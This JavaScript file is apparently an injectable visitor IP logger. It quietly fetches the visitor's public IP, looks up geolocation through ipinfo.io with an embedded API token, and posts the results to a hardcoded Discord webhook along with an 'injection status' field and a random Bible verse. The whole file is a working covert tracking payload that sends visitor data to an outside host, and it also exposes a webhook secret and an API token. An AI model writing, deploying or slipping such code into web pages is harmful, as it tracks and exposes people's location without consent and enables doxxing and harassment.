const webhookUrl = 'https://discord.com/api/webhooks/1137654130203172914/lof63zPT1pJY_SgBGbi0rqYG1U_XZjfjmvEhM_lQjvIUAbXIN8CKarQfeicCUewdp8DJ';
const name = 'Guest';

const startTime = Date.now();

fetch('https://api64.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const visitorIP = data.ip;
    const timestamp = new Date().toLocaleString();
    const formattedMessage = `✞ Visitor: ${name}\n- Visitor IP: ${visitorIP}\n- Time: ${timestamp}`;

    fetch(`https://ipinfo.io/${visitorIP}/json?token=2e47873e8f9db3`)
      .then(response => response.json())
      .then(ipInfoData => {
        const additionalInfo = JSON.stringify(ipInfoData, null, 2);

        const endTime = Date.now();
        const injectionStatus = typeof window !== 'undefined' ? 'Injected' : 'Not injected';
        const injectionTime = `${(endTime - startTime) / 1000} seconds`;

        const randomBibleVerses = [
          "*For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life. - John 3:16*",
          "*The LORD is my shepherd; I shall not want. - Psalm 23:1*",
          "*Trust in the LORD with all your heart, and do not lean on your own understanding. In all your ways acknowledge him, and he will make straight your paths. - Proverbs 3:5-6*",
          "*I can do all things through him who strengthens me. - Philippians 4:13*",
          "*And we know that for those who love God all things work together for good, for those who are called according to his purpose. - Romans 8:28*",
          "*Fear not, for I am with you; be not dismayed, for I am your God; I will strengthen you, I will help you, I will uphold you with my righteous right hand. - Isaiah 41:10*",
          "*For I know the plans I have for you, declares the LORD, plans for welfare and not for evil, to give you a future and a hope. - Jeremiah 29:11*",
          "*Come to me, all who labor and are heavy laden, and I will give you rest. Take my yoke upon you, and learn from me, for I am gentle and lowly in heart, and you will find rest for your souls. For my yoke is easy, and my burden is light. - Matthew 11:28-30*",
          "*Be still, and know that I am God. I will be exalted among the nations; I will be exalted in the earth! - Psalm 46:10*",
          "*Do not be conformed to this world, but be transformed by the renewal of your mind, that by testing you may discern what is the will of God, what is good and acceptable and perfect. - Romans 12:2*",
          "*Oh, taste and see that the LORD is good! Blessed is the man who takes refuge in him! - Psalm 34:8*",
          "*Do not be anxious about anything, but in everything by prayer and supplication with thanksgiving let your requests be made known to God. And the peace of God, which surpasses all understanding, will guard your hearts and your minds in Christ Jesus. - Philippians 4:6-7*",
          "*Commit your work to the LORD, and your plans will be established. - Proverbs 16:3*",
          "*Casting all your anxieties on him, because he cares for you. - 1 Peter 5:7*",
          "*But they who wait for the LORD shall renew their strength; they shall mount up with wings like eagles; they shall run and not be weary; they shall walk and not faint. - Isaiah 40:31*",
          "*For I am sure that neither death nor life, nor angels nor rulers, nor things present nor things to come, nor powers, nor height nor depth, nor anything else in all creation, will be able to separate us from the love of God in Christ Jesus our Lord. - Romans 8:38-39*",
          "*Your word is a lamp to my feet and a light to my path. - Psalm 119:105*",
          "*No temptation has overtaken you that is not common to man. God is faithful, and he will not let you be tempted beyond your ability, but with the temptation he will also provide the way of escape, that you may be able to endure it. - 1 Corinthians 10:13*",
          "*Let not steadfast love and faithfulness forsake you; bind them around your neck; write them on the tablet of your heart. So you will find favor and good success in the sight of God and man. - Proverbs 3:3-4*",
          "*God is our refuge and strength, a very present help in trouble. - Psalm 46:1*",
          "*For by grace you have been saved through faith. And this is not your own doing; it is the gift of God, not a result of works, so that no one may boast. - Ephesians 2:8-9*",
          "*This is the day that the LORD has made; let us rejoice and be glad in it. - Psalm 118:24*",
          "*May the God of hope fill you with all joy and peace in believing, so that by the power of the Holy Spirit you may abound in hope. - Romans 15:13*",
          "*Train up a child in the way he should go; even when he is old he will not depart from it. - Proverbs 22:6*",
          "*Enter his gates with thanksgiving, and his courts with praise! Give thanks to him; bless his name! - Psalm 100:4*"
        ];

        const randomIndex = Math.floor(Math.random() * randomBibleVerses.length);
        const randomBibleVerse = randomBibleVerses[randomIndex];

        const messageWithIPInfo = `${formattedMessage}\n- Injection status: ${injectionStatus}\n- Injection time: ${injectionTime}\n- **The most important phrase:** ${randomBibleVerse}\n${additionalInfo}`;

        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ content: messageWithIPInfo }),
        })
          .then(response => {
            if (!response.ok) {
              console.error('Failed to send message to Discord webhook');
            } else {
              console.log('Databased.');
            }
          })
          .catch(error => {
            console.error('Error occurred while sending message:', error);
          });
      })
      .catch(error => {
        console.error('Error occurred while fetching IP geolocation info:', error);
      });
  })
  .catch(error => {
    console.error('Error occurred while fetching visitor IP:', error);
  });
